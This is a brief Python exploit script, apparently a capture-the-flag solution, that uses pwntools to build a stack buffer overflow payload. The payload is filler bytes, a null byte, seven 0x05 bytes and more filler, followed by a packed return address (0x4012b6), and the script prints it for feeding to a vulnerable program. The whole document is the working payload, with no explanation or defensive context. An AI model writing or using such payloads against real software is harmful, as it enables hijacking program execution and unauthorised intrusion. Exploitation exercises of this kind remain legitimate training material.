#!/usr/bin/env python3
from pwn import *

payload =  b"A" * 8 + bytes([0]) + 7*bytes([5]) + b"B" * 8 + p64(0x4012b6)

print(payload, end="")
